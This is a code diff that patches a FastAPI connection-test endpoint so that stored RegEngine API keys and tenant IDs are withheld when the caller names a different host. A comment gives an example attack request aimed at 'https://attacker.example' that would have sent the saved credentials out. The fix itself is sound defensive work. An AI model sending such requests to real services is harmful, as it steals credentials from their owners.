@@ -1,9 +1,12 @@
 from __future__ import annotations
 
+from urllib.parse import urlparse
+
 from fastapi import APIRouter, Depends
 
 from ..controller import SimulationController
 from ..dependencies import get_active_controller
+from ..regengine_client import DEFAULT_LIVE_INGEST_ENDPOINT
 from ..schemas.domain import DestinationMode
 from ..schemas.integration import (
     ConnectionTestRequest,
@@ -38,18 +41,25 @@ async def integration_test(
 ) -> ConnectionTestResponse:
     request = request or ConnectionTestRequest()
     config = active_controller.config
-    delivery = config.delivery.model_copy(
-        update={
-            key: value
-            for key, value in {
-                "endpoint": request.endpoint,
-                "api_key": request.api_key,
-                "tenant_id": request.tenant_id,
-            }.items()
-            if value is not None
-        },
-        deep=True,
-    )
+    overrides = {
+        key: value
+        for key, value in {
+            "endpoint": request.endpoint,
+            "api_key": request.api_key,
+            "tenant_id": request.tenant_id,
+        }.items()
+        if value is not None
+    }
+    # Never send the stored API key / tenant id to a host the caller just
+    # named. Probing a different host requires passing its credentials
+    # explicitly, otherwise `POST {"endpoint": "https://attacker.example"}`
+    # would exfiltrate the saved RegEngine credentials in request headers.
+    if request.endpoint is not None and _endpoint_host(str(request.endpoint)) != _endpoint_host(
+        str(config.delivery.endpoint) if config.delivery.endpoint else DEFAULT_LIVE_INGEST_ENDPOINT
+    ):
+        overrides.setdefault("api_key", None)
+        overrides.setdefault("tenant_id", None)
+    delivery = config.delivery.model_copy(update=overrides, deep=True)
     if config.delivery.mode == DestinationMode.MOCK and not (
         request.api_key or request.tenant_id or request.endpoint
     ):
@@ -72,3 +82,7 @@ async def integration_test(
         endpoint_host=result.endpoint_host,
         mode=config.delivery.mode,
     )
+
+
+def _endpoint_host(endpoint: str) -> str:
+    return (urlparse(endpoint).hostname or "").strip().lower().rstrip(".")
